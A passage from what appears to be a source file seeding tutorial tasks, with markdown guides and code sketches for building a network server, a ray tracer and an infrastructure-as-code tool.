				['Implement packet parsing', 'Read bytes, decode headers. Handle variable-length fields.',
`## Packet Parsing

### DNS Header Parsing
\`\`\`rust
struct DnsHeader {
    id: u16,
    flags: u16,
    qd_count: u16,
    an_count: u16,
    ns_count: u16,
    ar_count: u16,
}

fn parse_dns_header(buf: &[u8]) -> DnsHeader {
    DnsHeader {
        id: u16::from_be_bytes([buf[0], buf[1]]),
        flags: u16::from_be_bytes([buf[2], buf[3]]),
        qd_count: u16::from_be_bytes([buf[4], buf[5]]),
        // ...
    }
}
\`\`\`

### HTTP Request Parsing
\`\`\`rust
fn parse_http_request(buf: &[u8]) -> Result<HttpRequest> {
    let text = std::str::from_utf8(buf)?;
    let mut lines = text.lines();

    // Request line: GET /path HTTP/1.1
    let request_line = lines.next()?;
    let parts: Vec<&str> = request_line.split(' ').collect();
    let method = parts[0];
    let path = parts[1];

    // Headers until empty line
    let mut headers = HashMap::new();
    for line in lines {
        if line.is_empty() { break; }
        let (key, value) = line.split_once(": ")?;
        headers.insert(key.to_string(), value.to_string());
    }

    Ok(HttpRequest { method, path, headers })
}
\`\`\`

## Completion Criteria
- [ ] Parse headers correctly
- [ ] Handle variable lengths
- [ ] Network byte order`],

				['Build packet construction', 'Serialize to bytes. Network byte order. Calculate checksums.',
`## Packet Construction

### DNS Response
\`\`\`rust
fn build_dns_response(query: &DnsQuery, ip: Ipv4Addr) -> Vec<u8> {
    let mut buf = Vec::new();

    // Header
    buf.extend(&query.id.to_be_bytes());
    buf.extend(&0x8180u16.to_be_bytes()); // Response, no error
    buf.extend(&1u16.to_be_bytes());      // Questions
    buf.extend(&1u16.to_be_bytes());      // Answers
    buf.extend(&0u16.to_be_bytes());      // NS
    buf.extend(&0u16.to_be_bytes());      // AR

    // Question (copy from query)
    buf.extend(&query.question);

    // Answer
    buf.extend(&[0xc0, 0x0c]);            // Name pointer
    buf.extend(&1u16.to_be_bytes());      // Type A
    buf.extend(&1u16.to_be_bytes());      // Class IN
    buf.extend(&300u32.to_be_bytes());    // TTL
    buf.extend(&4u16.to_be_bytes());      // Data length
    buf.extend(&ip.octets());             // IP address

    buf
}
\`\`\`

### HTTP Response
\`\`\`rust
fn build_http_response(status: u16, body: &[u8]) -> Vec<u8> {
    let status_text = match status {
        200 => "OK",
        404 => "Not Found",
        _ => "Unknown",
    };

    let headers = format!(
        "HTTP/1.1 {} {}\\r\\n\
         Content-Length: {}\\r\\n\
         Connection: close\\r\\n\
         \\r\\n",
        status, status_text, body.len()
    );

    let mut response = headers.into_bytes();
    response.extend(body);
    response
}
\`\`\`

## Completion Criteria
- [ ] Valid packet format
- [ ] Big-endian encoding
- [ ] Checksums if needed`],

				['Add error handling', 'Validate input. Handle timeouts, partial reads.',
`## Error Handling

### Input Validation
\`\`\`rust
fn parse_packet(buf: &[u8]) -> Result<Packet, ParseError> {
    if buf.len() < MIN_HEADER_SIZE {
        return Err(ParseError::TooShort);
    }

    let length = u16::from_be_bytes([buf[0], buf[1]]) as usize;
    if length > MAX_PACKET_SIZE {
        return Err(ParseError::TooLong);
    }

    if buf.len() < length {
        return Err(ParseError::Incomplete);
    }

    // Parse fields...
    Ok(packet)
}
\`\`\`

### Connection Errors
\`\`\`rust
fn handle_connection(mut conn: TcpStream) -> Result<()> {
    conn.set_read_timeout(Some(Duration::from_secs(30)))?;
    conn.set_write_timeout(Some(Duration::from_secs(10)))?;

    loop {
        match read_request(&mut conn) {
            Ok(req) => {
                let resp = process(req);
                conn.write_all(&resp)?;
            }
            Err(e) if e.kind() == io::ErrorKind::TimedOut => {
                break; // Idle timeout
            }
            Err(e) if e.kind() == io::ErrorKind::ConnectionReset => {
                break; // Client disconnected
            }
            Err(e) => {
                send_error_response(&mut conn, 400);
                break;
            }
        }
    }
    Ok(())
}
\`\`\`

## Completion Criteria
- [ ] Validate all input
- [ ] Timeouts configured
- [ ] Graceful error responses`],
			]},
			{ name: 'Core Implementation', desc: 'Main functionality', tasks: [
				['Implement server/client', 'Server: bind, accept, handle. Client: connect, request, response.',
`## Server Implementation

### TCP Server
\`\`\`go
func runServer(addr string) error {
    listener, err := net.Listen("tcp", addr)
    if err != nil {
        return err
    }

    for {
        conn, err := listener.Accept()
        if err != nil {
            log.Printf("Accept error: %v", err)
            continue
        }
        go handleClient(conn)
    }
}

func handleClient(conn net.Conn) {
    defer conn.Close()
    // Read request, process, write response
}
\`\`\`

### Client
\`\`\`go
func sendRequest(addr string, req []byte) ([]byte, error) {
    conn, err := net.Dial("tcp", addr)
    if err != nil {
        return nil, err
    }
    defer conn.Close()

    conn.Write(req)

    response, err := io.ReadAll(conn)
    return response, err
}
\`\`\`

## Completion Criteria
- [ ] Server accepts clients
- [ ] Client sends requests
- [ ] Proper cleanup`],

				['Add request handling', 'Route to handler based on path/query. Validate input.',
`## Request Routing

### HTTP Router
\`\`\`go
type Router struct {
    routes map[string]http.HandlerFunc
}

func (r *Router) Handle(method, path string, handler http.HandlerFunc) {
    key := method + " " + path
    r.routes[key] = handler
}

func (r *Router) ServeHTTP(w http.ResponseWriter, req *http.Request) {
    key := req.Method + " " + req.URL.Path
    if handler, ok := r.routes[key]; ok {
        handler(w, req)
    } else {
        http.NotFound(w, req)
    }
}
\`\`\`

### DNS Handler
\`\`\`rust
fn handle_dns_query(query: &DnsQuery) -> DnsResponse {
    match query.qtype {
        QType::A => lookup_a_record(&query.name),
        QType::AAAA => lookup_aaaa_record(&query.name),
        QType::MX => lookup_mx_record(&query.name),
        _ => DnsResponse::not_implemented(),
    }
}
\`\`\`

## Completion Criteria
- [ ] Routing works
- [ ] Input validated
- [ ] Appropriate responses`],

				['Build response generation', 'Construct valid responses. Status, headers, body.',
`## Response Generation

### HTTP Response Builder
\`\`\`rust
struct ResponseBuilder {
    status: u16,
    headers: HashMap<String, String>,
    body: Vec<u8>,
}

impl ResponseBuilder {
    fn new(status: u16) -> Self {
        let mut rb = Self {
            status,
            headers: HashMap::new(),
            body: Vec::new(),
        };
        rb.headers.insert("Server".into(), "MyServer/1.0".into());
        rb
    }

    fn header(mut self, key: &str, value: &str) -> Self {
        self.headers.insert(key.into(), value.into());
        self
    }

    fn body(mut self, body: Vec<u8>) -> Self {
        self.headers.insert(
            "Content-Length".into(),
            body.len().to_string()
        );
        self.body = body;
        self
    }

    fn build(self) -> Vec<u8> {
        // Format as HTTP response
    }
}
\`\`\`

## Completion Criteria
- [ ] Valid format
- [ ] Required headers
- [ ] Correct status codes`],

				['Implement connection management', 'Limits, timeouts, keep-alive, graceful shutdown.',
`## Connection Management

### Connection Limits
\`\`\`rust
struct Server {
    max_connections: usize,
    active: AtomicUsize,
}

fn accept_connection(&self, conn: TcpStream) {
    if self.active.load(Ordering::Relaxed) >= self.max_connections {
        // Send 503 Service Unavailable
        return;
    }
    self.active.fetch_add(1, Ordering::Relaxed);
    spawn(move || {
        handle(conn);
        self.active.fetch_sub(1, Ordering::Relaxed);
    });
}
\`\`\`

### Graceful Shutdown
\`\`\`rust
fn shutdown(&self, timeout: Duration) {
    // Stop accepting new connections
    self.accepting.store(false, Ordering::Relaxed);

    // Wait for active connections
    let deadline = Instant::now() + timeout;
    while self.active.load(Ordering::Relaxed) > 0 {
        if Instant::now() > deadline {
            break; // Force close remaining
        }
        thread::sleep(Duration::from_millis(100));
    }
}
\`\`\`

## Completion Criteria
- [ ] Connection limits
- [ ] Timeouts working
- [ ] Graceful shutdown`],

				['Add logging', 'Timestamp, client IP, request, response code, duration.',
`## Logging

### Structured Logging
\`\`\`rust
#[derive(Serialize)]
struct AccessLog {
    timestamp: String,
    client_ip: String,
    method: String,
    path: String,
    status: u16,
    duration_ms: u64,
    bytes_sent: usize,
}

fn log_request(req: &Request, resp: &Response, duration: Duration) {
    let log = AccessLog {
        timestamp: Utc::now().to_rfc3339(),
        client_ip: req.client_ip.to_string(),
        method: req.method.clone(),
        path: req.path.clone(),
        status: resp.status,
        duration_ms: duration.as_millis() as u64,
        bytes_sent: resp.body.len(),
    };
    println!("{}", serde_json::to_string(&log).unwrap());
}
\`\`\`

### Log Levels
\`\`\`rust
log::debug!("Parsing request");
log::info!("Request {} {} -> {}", method, path, status);
log::warn!("Slow request: {}ms", duration);
log::error!("Connection error: {}", e);
\`\`\`

## Completion Criteria
- [ ] Structured format
- [ ] All requests logged
- [ ] Duration tracked`],
			]},
			{ name: 'Advanced Features', desc: 'Production ready', tasks: [
				['Add TLS support', 'Load certificate, configure ciphers, handle SNI.',
`## TLS Configuration

### Loading Certificates
\`\`\`rust
use rustls::{ServerConfig, Certificate, PrivateKey};

fn load_tls_config(cert_path: &str, key_path: &str) -> ServerConfig {
    let cert_file = File::open(cert_path)?;
    let key_file = File::open(key_path)?;

    let certs = rustls_pemfile::certs(&mut BufReader::new(cert_file))?
        .into_iter()
        .map(Certificate)
        .collect();

    let key = rustls_pemfile::pkcs8_private_keys(&mut BufReader::new(key_file))?
        .remove(0);

    ServerConfig::builder()
        .with_safe_defaults()
        .with_no_client_auth()
        .with_single_cert(certs, PrivateKey(key))?
}
\`\`\`

### SNI for Multiple Domains
\`\`\`rust
let resolver = rustls::server::ResolvesServerCertUsingSni::new();
resolver.add("example.com", cert_resolver)?;
resolver.add("other.com", other_cert_resolver)?;
\`\`\`

## Completion Criteria
- [ ] TLS working
- [ ] Valid certificates
- [ ] SNI if needed`],

				['Implement caching', 'Cache by key, TTL expiration, LRU eviction.',
`## Response Caching

### LRU Cache
\`\`\`rust
use lru::LruCache;

struct Cache {
    entries: LruCache<String, CacheEntry>,
}

struct CacheEntry {
    data: Vec<u8>,
    expires_at: Instant,
    etag: String,
}

impl Cache {
    fn get(&mut self, key: &str) -> Option<&CacheEntry> {
        let entry = self.entries.get(key)?;
        if Instant::now() > entry.expires_at {
            self.entries.pop(key);
            return None;
        }
        Some(entry)
    }

    fn set(&mut self, key: String, data: Vec<u8>, ttl: Duration) {
        self.entries.put(key, CacheEntry {
            data,
            expires_at: Instant::now() + ttl,
            etag: generate_etag(&data),
        });
    }
}
\`\`\`

## Completion Criteria
- [ ] Cache hits work
- [ ] TTL expiration
- [ ] Memory bounded`],

				['Build health checks', 'Health endpoint. Check dependencies. Liveness/readiness.',
`## Health Checks

### Endpoint
\`\`\`rust
fn health_handler() -> Response {
    let db_ok = check_database();
    let cache_ok = check_cache();

    if db_ok && cache_ok {
        Response::ok(json!({"status": "healthy"}))
    } else {
        Response::service_unavailable(json!({
            "status": "unhealthy",
            "database": db_ok,
            "cache": cache_ok,
        }))
    }
}
\`\`\`

### Kubernetes Probes
\`\`\`yaml
livenessProbe:
  httpGet:
    path: /healthz
    port: 8080
  initialDelaySeconds: 5
  periodSeconds: 10

readinessProbe:
  httpGet:
    path: /ready
    port: 8080
  periodSeconds: 5
\`\`\`

## Completion Criteria
- [ ] Health endpoint
- [ ] Dependency checks
- [ ] K8s compatible`],

				['Add configuration', 'Config file or env vars. Reload without restart.',
`## Configuration

### Config File
\`\`\`rust
#[derive(Deserialize)]
struct Config {
    port: u16,
    tls_cert: Option<String>,
    tls_key: Option<String>,
    log_level: String,
    timeouts: TimeoutConfig,
}

fn load_config(path: &str) -> Config {
    let content = fs::read_to_string(path)?;
    toml::from_str(&content)?
}
\`\`\`

### Environment Variables
\`\`\`rust
let port = env::var("PORT")
    .unwrap_or("8080".to_string())
    .parse()?;
\`\`\`

### Hot Reload
\`\`\`rust
// Watch for SIGHUP
signal_hook::flag::register(SIGHUP, reload_flag.clone())?;

if reload_flag.load(Ordering::Relaxed) {
    config = load_config(CONFIG_PATH)?;
    reload_flag.store(false, Ordering::Relaxed);
}
\`\`\`

## Completion Criteria
- [ ] Config loads
- [ ] Env overrides
- [ ] Reload works`],

				['Performance testing', 'Benchmark with wrk/hey. Profile. Optimize hot paths.',
`## Performance Testing

### Benchmarking
\`\`\`bash
# wrk - HTTP benchmarking tool
wrk -t4 -c100 -d30s http://localhost:8080/

# Output:
# Requests/sec: 50000
# Latency avg: 2ms, p99: 10ms

# hey - alternative
hey -n 10000 -c 100 http://localhost:8080/
\`\`\`

### Profiling
\`\`\`go
import _ "net/http/pprof"

// Access: http://localhost:6060/debug/pprof/
// CPU profile:
go tool pprof http://localhost:6060/debug/pprof/profile
\`\`\`

### Targets
- Latency p50 < 5ms
- Latency p99 < 50ms
- Throughput > 10k req/sec

## Completion Criteria
- [ ] Benchmarks run
- [ ] Profile analyzed
- [ ] Bottlenecks identified`],
			]},
		]);
	} else if (path.name.includes('Ray Tracer')) {
		addTasks(path.id, [
			{ name: 'Ray Tracing Basics', desc: 'Core algorithm', tasks: [
				['Implement ray-sphere intersection', 'Solve quadratic equation for ray-sphere intersection. Return hit distance and normal.',
`## Ray-Sphere Intersection

### Math
\`\`\`
Ray: P(t) = O + tD  (origin + t * direction)
Sphere: |P - C|² = r²

Substitute: |O + tD - C|² = r²
Let L = O - C
t² + 2t(D·L) + (L·L - r²) = 0

Quadratic: at² + bt + c = 0
a = D·D = 1 (if normalized)
b = 2(D·L)
c = L·L - r²

discriminant = b² - 4ac
\`\`\`

### Code
\`\`\`rust
fn intersect_sphere(ray: &Ray, sphere: &Sphere) -> Option<Hit> {
    let l = ray.origin - sphere.center;
    let a = ray.direction.dot(ray.direction);
    let b = 2.0 * ray.direction.dot(l);
    let c = l.dot(l) - sphere.radius * sphere.radius;

    let discriminant = b * b - 4.0 * a * c;
    if discriminant < 0.0 {
        return None;
    }

    let t = (-b - discriminant.sqrt()) / (2.0 * a);
    if t < 0.0 {
        return None;
    }

    let point = ray.at(t);
    let normal = (point - sphere.center).normalize();
    Some(Hit { t, point, normal })
}
\`\`\`

## Completion Criteria
- [ ] Correct intersection math
- [ ] Returns hit distance
- [ ] Normal computed correctly`],

				['Build camera model', 'Define position, look-at, FOV. Compute ray direction for each pixel.',
`## Camera Model

### Camera Setup
\`\`\`rust
struct Camera {
    origin: Vec3,
    lower_left: Vec3,
    horizontal: Vec3,
    vertical: Vec3,
}

impl Camera {
    fn new(look_from: Vec3, look_at: Vec3, up: Vec3, fov: f64, aspect: f64) -> Self {
        let theta = fov.to_radians();
        let h = (theta / 2.0).tan();
        let viewport_height = 2.0 * h;
        let viewport_width = aspect * viewport_height;

        let w = (look_from - look_at).normalize();
        let u = up.cross(w).normalize();
        let v = w.cross(u);

        let horizontal = viewport_width * u;
        let vertical = viewport_height * v;
        let lower_left = look_from - horizontal/2.0 - vertical/2.0 - w;

        Camera { origin: look_from, lower_left, horizontal, vertical }
    }

    fn get_ray(&self, s: f64, t: f64) -> Ray {
        Ray {
            origin: self.origin,
            direction: (self.lower_left + s*self.horizontal + t*self.vertical - self.origin).normalize(),
        }
    }
}
\`\`\`

## Completion Criteria
- [ ] FOV works correctly
- [ ] Aspect ratio handled
- [ ] Ray direction correct`],

				['Add basic shading', 'Diffuse (Lambertian) shading: color * max(0, N·L).',
`## Diffuse Shading

### Lambertian BRDF
\`\`\`rust
fn shade(hit: &Hit, light: &Light, material: &Material) -> Color {
    let light_dir = (light.position - hit.point).normalize();
    let n_dot_l = hit.normal.dot(light_dir).max(0.0);

    // Distance attenuation
    let distance = (light.position - hit.point).length();
    let attenuation = 1.0 / (distance * distance);

    material.color * light.color * light.intensity * n_dot_l * attenuation
}
\`\`\`

### Multiple Lights
\`\`\`rust
fn shade_all_lights(hit: &Hit, lights: &[Light], material: &Material) -> Color {
    let mut color = Color::BLACK;
    for light in lights {
        color = color + shade(hit, light, material);
    }
    color
}
\`\`\`

## Completion Criteria
- [ ] Diffuse lighting works
- [ ] Distance attenuation
- [ ] Multiple lights sum`],

				['Implement shadows', 'Cast shadow ray toward light. Skip light contribution if blocked.',
`## Shadow Rays

### Implementation
\`\`\`rust
fn is_in_shadow(hit: &Hit, light: &Light, scene: &Scene) -> bool {
    let to_light = light.position - hit.point;
    let distance = to_light.length();
    let shadow_ray = Ray {
        origin: hit.point + hit.normal * EPSILON,  // Offset to avoid self-intersection
        direction: to_light.normalize(),
    };

    if let Some(shadow_hit) = scene.intersect(&shadow_ray) {
        shadow_hit.t < distance
    } else {
        false
    }
}

fn shade_with_shadows(hit: &Hit, light: &Light, material: &Material, scene: &Scene) -> Color {
    if is_in_shadow(hit, light, scene) {
        return Color::BLACK;
    }
    shade(hit, light, material)
}
\`\`\`

## Completion Criteria
- [ ] Shadow rays work
- [ ] No self-shadowing artifacts
- [ ] Correct shadow boundaries`],

				['Add reflections', 'Compute reflection direction. Recursively trace reflected rays.',
`## Reflections

### Reflection Direction
\`\`\`rust
fn reflect(d: Vec3, n: Vec3) -> Vec3 {
    d - 2.0 * d.dot(n) * n
}
\`\`\`

### Recursive Tracing
\`\`\`rust
fn trace(ray: &Ray, scene: &Scene, depth: u32) -> Color {
    if depth == 0 {
        return Color::BLACK;
    }

    if let Some(hit) = scene.intersect(ray) {
        let material = scene.get_material(hit.object_id);
        let mut color = shade_all_lights(&hit, &scene.lights, material);

        if material.reflectivity > 0.0 {
            let reflect_dir = reflect(ray.direction, hit.normal);
            let reflect_ray = Ray {
                origin: hit.point + hit.normal * EPSILON,
                direction: reflect_dir,
            };
            let reflect_color = trace(&reflect_ray, scene, depth - 1);
            color = color * (1.0 - material.reflectivity)
                  + reflect_color * material.reflectivity;
        }
        color
    } else {
        scene.background_color
    }
}
\`\`\`

## Completion Criteria
- [ ] Reflections render correctly
- [ ] Recursion depth limited
- [ ] Proper color blending`],
			]},
			{ name: 'Materials & Lighting', desc: 'Realistic rendering', tasks: [
				['Implement materials', 'Diffuse, specular, glass (refraction). Fresnel effect.',
`## Material Types

### Diffuse (Lambertian)
\`\`\`rust
fn scatter_diffuse(hit: &Hit) -> Ray {
    let target = hit.point + hit.normal + random_unit_vector();
    Ray { origin: hit.point, direction: (target - hit.point).normalize() }
}
\`\`\`

### Specular (Mirror)
\`\`\`rust
fn scatter_specular(ray: &Ray, hit: &Hit, fuzz: f64) -> Ray {
    let reflected = reflect(ray.direction, hit.normal);
    Ray {
        origin: hit.point,
        direction: (reflected + fuzz * random_unit_vector()).normalize(),
    }
}
\`\`\`

### Dielectric (Glass)
\`\`\`rust
fn scatter_dielectric(ray: &Ray, hit: &Hit, ior: f64) -> Ray {
    let ratio = if hit.front_face { 1.0 / ior } else { ior };
    let cos_theta = (-ray.direction).dot(hit.normal).min(1.0);
    let sin_theta = (1.0 - cos_theta * cos_theta).sqrt();

    let cannot_refract = ratio * sin_theta > 1.0;
    let reflectance = schlick(cos_theta, ratio);

    let direction = if cannot_refract || reflectance > random() {
        reflect(ray.direction, hit.normal)
    } else {
        refract(ray.direction, hit.normal, ratio)
    };
    Ray { origin: hit.point, direction }
}
\`\`\`

## Completion Criteria
- [ ] Diffuse materials
- [ ] Reflective materials
- [ ] Glass refraction`],

				['Add multiple light sources', 'Point, directional, area lights. Soft shadows.',
`## Light Types

### Point Light
\`\`\`rust
struct PointLight {
    position: Vec3,
    color: Color,
    intensity: f64,
}
\`\`\`

### Directional Light
\`\`\`rust
struct DirectionalLight {
    direction: Vec3,  // From light toward scene
    color: Color,
    intensity: f64,
}

// No distance attenuation (infinitely far)
\`\`\`

### Area Light (Soft Shadows)
\`\`\`rust
struct AreaLight {
    center: Vec3,
    u: Vec3,
    v: Vec3,
    color: Color,
}

fn sample_area_light(&self) -> Vec3 {
    let ru = random() - 0.5;
    let rv = random() - 0.5;
    self.center + ru * self.u + rv * self.v
}

// Cast multiple shadow rays to random points
fn soft_shadow(hit: &Hit, light: &AreaLight, scene: &Scene, samples: u32) -> f64 {
    let mut visible = 0;
    for _ in 0..samples {
        let point = light.sample_area_light();
        if !is_shadowed(hit, point, scene) {
            visible += 1;
        }
    }
    visible as f64 / samples as f64
}
\`\`\`

## Completion Criteria
- [ ] Point lights work
- [ ] Directional lights
- [ ] Soft shadows from area lights`],

				['Build BVH acceleration', 'Bounding Volume Hierarchy for O(log n) intersection.',
`## BVH Construction

### AABB (Axis-Aligned Bounding Box)
\`\`\`rust
struct AABB {
    min: Vec3,
    max: Vec3,
}

impl AABB {
    fn intersect(&self, ray: &Ray) -> bool {
        for axis in 0..3 {
            let inv_d = 1.0 / ray.direction[axis];
            let t0 = (self.min[axis] - ray.origin[axis]) * inv_d;
            let t1 = (self.max[axis] - ray.origin[axis]) * inv_d;
            let (t0, t1) = if inv_d < 0.0 { (t1, t0) } else { (t0, t1) };
            // Check overlap
        }
        true
    }
}
\`\`\`

### BVH Node
\`\`\`rust
enum BVHNode {
    Leaf { objects: Vec<ObjectId>, bounds: AABB },
    Interior { left: Box<BVHNode>, right: Box<BVHNode>, bounds: AABB },
}

fn build_bvh(objects: &mut [Object], axis: usize) -> BVHNode {
    if objects.len() <= 4 {
        return BVHNode::Leaf { ... };
    }

    // Sort by centroid on axis
    objects.sort_by(|a, b| {
        a.centroid()[axis].partial_cmp(&b.centroid()[axis]).unwrap()
    });

    let mid = objects.len() / 2;
    let left = build_bvh(&mut objects[..mid], (axis + 1) % 3);
    let right = build_bvh(&mut objects[mid..], (axis + 1) % 3);

    BVHNode::Interior { left: Box::new(left), right: Box::new(right), ... }
}
\`\`\`

## Completion Criteria
- [ ] AABB intersection fast
- [ ] BVH construction
- [ ] O(log n) traversal`],

				['Implement textures', 'UV mapping. Image sampling. Normal maps.',
`## Texturing

### UV Mapping (Sphere)
\`\`\`rust
fn sphere_uv(point: Vec3, center: Vec3, radius: f64) -> (f64, f64) {
    let p = (point - center) / radius;
    let theta = (-p.y).acos();
    let phi = (-p.z).atan2(p.x) + PI;

    let u = phi / (2.0 * PI);
    let v = theta / PI;
    (u, v)
}
\`\`\`

### Image Sampling
\`\`\`rust
fn sample_texture(texture: &Image, u: f64, v: f64) -> Color {
    let u = u.clamp(0.0, 1.0);
    let v = 1.0 - v.clamp(0.0, 1.0);  // Flip V

    let i = (u * texture.width as f64) as usize;
    let j = (v * texture.height as f64) as usize;

    texture.get_pixel(i.min(texture.width - 1), j.min(texture.height - 1))
}
\`\`\`

### Normal Mapping
\`\`\`rust
fn perturb_normal(hit: &Hit, normal_map: &Image, u: f64, v: f64) -> Vec3 {
    let tex_normal = sample_texture(normal_map, u, v);
    let n = Vec3::new(tex_normal.r * 2.0 - 1.0, tex_normal.g * 2.0 - 1.0, tex_normal.b * 2.0 - 1.0);
    // Transform from tangent space to world space
    hit.tbn_matrix * n
}
\`\`\`

## Completion Criteria
- [ ] UV mapping works
- [ ] Textures sample correctly
- [ ] Normal maps add detail`],

				['Add anti-aliasing', 'Supersampling: multiple rays per pixel. Stratified sampling.',
`## Anti-Aliasing

### Basic Supersampling
\`\`\`rust
fn render_pixel(x: u32, y: u32, samples: u32) -> Color {
    let mut color = Color::BLACK;
    for _ in 0..samples {
        let u = (x as f64 + random()) / (width as f64);
        let v = (y as f64 + random()) / (height as f64);
        let ray = camera.get_ray(u, v);
        color = color + trace(&ray, &scene, MAX_DEPTH);
    }
    color / samples as f64
}
\`\`\`

### Stratified Sampling
\`\`\`rust
fn render_pixel_stratified(x: u32, y: u32, grid_size: u32) -> Color {
    let mut color = Color::BLACK;
    for sy in 0..grid_size {
        for sx in 0..grid_size {
            // Jitter within stratum
            let u = (x as f64 + (sx as f64 + random()) / grid_size as f64) / width as f64;
            let v = (y as f64 + (sy as f64 + random()) / grid_size as f64) / height as f64;
            let ray = camera.get_ray(u, v);
            color = color + trace(&ray, &scene, MAX_DEPTH);
        }
    }
    color / (grid_size * grid_size) as f64
}
\`\`\`

## Completion Criteria
- [ ] Smooth edges
- [ ] Configurable samples
- [ ] Stratified option`],
			]},
		]);
	} else if (path.name.includes('Terraform') || path.name.includes('DevOps')) {
		addTasks(path.id, [
			{ name: 'Infrastructure Basics', desc: 'Core concepts', tasks: [
				['Understand IaC principles', 'Declare desired state in code. Version control. Reproducible environments.',
`## Infrastructure as Code

### Core Principles
\`\`\`
1. Declarative: Describe WHAT, not HOW
2. Idempotent: Apply multiple times, same result
3. Version controlled: Git for infrastructure
4. Reviewable: PRs for changes
\`\`\`

### Workflow
\`\`\`
code → plan → review → apply → state updated
\`\`\`

### Drift Detection
\`\`\`bash
# Compare actual vs desired
terraform plan

# If drift found:
# - Accept changes (terraform apply)
# - Or fix manually and import
\`\`\`

## Completion Criteria
- [ ] Understand declarative model
- [ ] Know plan/apply workflow
- [ ] Understand drift detection`],

				['Design resource model', 'Resource type, name, attributes. State file tracks IDs and dependencies.',
`## Resource Model

### Resource Structure
\`\`\`hcl
resource "aws_instance" "web" {
  ami           = "ami-12345"
  instance_type = "t3.micro"
  tags = {
    Name = "web-server"
  }
}
\`\`\`

### State File
\`\`\`json
{
  "resources": [
    {
      "type": "aws_instance",
      "name": "web",
      "provider": "provider.aws",
      "instances": [{
        "attributes": {
          "id": "i-1234567890",
          "ami": "ami-12345",
          "public_ip": "1.2.3.4"
        }
      }]
    }
  ]
}
\`\`\`

## Completion Criteria
- [ ] Resource definition format
- [ ] State structure
- [ ] ID tracking`],

				['Implement provider interface', 'CRUD operations: Create, Read, Update, Delete. Wrap cloud API.',
`## Provider Interface

### CRUD Operations
\`\`\`go
type ResourceProvider interface {
    Create(config ResourceConfig) (string, error)
    Read(id string) (ResourceConfig, error)
    Update(id string, config ResourceConfig) error
    Delete(id string) error
}

type AWSInstanceProvider struct {
    client *ec2.Client
}

func (p *AWSInstanceProvider) Create(config ResourceConfig) (string, error) {
    input := &ec2.RunInstancesInput{
        ImageId:      aws.String(config["ami"]),
        InstanceType: aws.String(config["instance_type"]),
    }
    result, err := p.client.RunInstances(input)
    return *result.Instances[0].InstanceId, err
}
\`\`\`

## Completion Criteria
- [ ] Create returns ID
- [ ] Read fetches current state
- [ ] Update modifies resource
- [ ] Delete removes resource`],

				['Build plan/apply workflow', 'Plan: diff desired vs actual. Apply: execute changes.',
`## Plan/Apply

### Plan Phase
\`\`\`go
func Plan(config, state ResourceMap) []Change {
    var changes []Change

    for name, desired := range config {
        current, exists := state[name]
        if !exists {
            changes = append(changes, Change{Type: Create, Resource: desired})
        } else if !equal(current, desired) {
            changes = append(changes, Change{Type: Update, Resource: desired})
        }
    }

    for name := range state {
        if _, exists := config[name]; !exists {
            changes = append(changes, Change{Type: Destroy, Resource: state[name]})
        }
    }
    return changes
}
\`\`\`

### Apply Phase
\`\`\`go
func Apply(changes []Change, provider Provider) error {
    for _, change := range changes {
        switch change.Type {
        case Create:
            id, _ := provider.Create(change.Resource)
            updateState(change.Name, id)
        case Update:
            provider.Update(change.ID, change.Resource)
        case Destroy:
            provider.Delete(change.ID)
            removeFromState(change.Name)
        }
    }
    return nil
}
\`\`\`

## Completion Criteria
- [ ] Plan shows changes
- [ ] Apply executes changes
- [ ] State updated after apply`],

				['Add state management', 'Store IDs and attributes. Lock during operations. Detect drift.',
`## State Management

### State Locking
\`\`\`go
func (s *StateManager) Lock() error {
    // Acquire distributed lock (DynamoDB, Consul, etc.)
    lockID := uuid.New().String()
    err := s.backend.AcquireLock(lockID, time.Minute * 10)
    if err != nil {
        return fmt.Errorf("state locked by another process")
    }
    s.lockID = lockID
    return nil
}

func (s *StateManager) Unlock() error {
    return s.backend.ReleaseLock(s.lockID)
}
\`\`\`

### Refresh (Drift Detection)
\`\`\`go
func (s *StateManager) Refresh(provider Provider) error {
    for name, resource := range s.state.Resources {
        current, err := provider.Read(resource.ID)
        if err != nil {
            // Resource may have been deleted
        }
        s.state.Resources[name].Attributes = current
    }
    return s.Save()
}
\`\`\`

## Completion Criteria
- [ ] Locking prevents conflicts
- [ ] Refresh updates state
- [ ] Drift detected`],
			]},
			{ name: 'Advanced Features', desc: 'Production features', tasks: [
				['Implement modules', 'Reusable resource groups. Parameterized with variables.',
`## Modules

### Module Structure
\`\`\`
modules/vpc/
├── main.tf      # Resources
├── variables.tf # Inputs
├── outputs.tf   # Outputs
\`\`\`

### Module Usage
\`\`\`hcl
module "vpc" {
  source = "./modules/vpc"
  cidr   = "10.0.0.0/16"
  name   = "production"
}
\`\`\`

### Variables
\`\`\`hcl
# modules/vpc/variables.tf
variable "cidr" {
  type        = string
  description = "VPC CIDR block"
}

variable "name" {
  type    = string
  default = "default"
}
\`\`\`

## Completion Criteria
- [ ] Module definition
- [ ] Variable passing
- [ ] Output values`],

				['Add variables and outputs', 'Variables for inputs. Outputs export values between modules.',
`## Variables and Outputs

### Variable Types
\`\`\`hcl
variable "instance_count" {
  type    = number
  default = 1
}

variable "tags" {
  type = map(string)
  default = {}
}

variable "subnets" {
  type = list(string)
}
\`\`\`

### Variable Files
\`\`\`hcl
# terraform.tfvars
instance_count = 3
tags = {
  Environment = "prod"
}
\`\`\`

### Outputs
\`\`\`hcl
output "instance_ids" {
  value = aws_instance.web[*].id
}

# Use from another module
module.vpc.instance_ids
\`\`\`

## Completion Criteria
- [ ] Variable types
- [ ] Default values
- [ ] Outputs defined`],

				['Build dependency graph', 'Parse references. Topological sort. Parallel execution.',
`## Dependency Graph

### Implicit Dependencies
\`\`\`hcl
resource "aws_instance" "web" {
  subnet_id = aws_subnet.main.id  # Implicit dependency
}
\`\`\`

### Graph Construction
\`\`\`go
func BuildGraph(config ResourceMap) *Graph {
    g := NewGraph()
    for name, resource := range config {
        g.AddNode(name)
        for _, ref := range extractReferences(resource) {
            g.AddEdge(ref, name)  // ref must be created before name
        }
    }
    return g
}

func (g *Graph) TopologicalSort() ([]string, error) {
    // Returns execution order
    // Error if cycle detected
}
\`\`\`

### Parallel Execution
\`\`\`go
func ApplyParallel(order [][]string, provider Provider) {
    for _, batch := range order {
        var wg sync.WaitGroup
        for _, resource := range batch {
            wg.Add(1)
            go func(r string) {
                defer wg.Done()
                apply(r, provider)
            }(resource)
        }
        wg.Wait()
    }
}
\`\`\`

## Completion Criteria
- [ ] Dependencies detected
- [ ] Cycle detection
- [ ] Parallel when possible`],

				['Implement import', 'Adopt existing resources into state.',
`## Resource Import

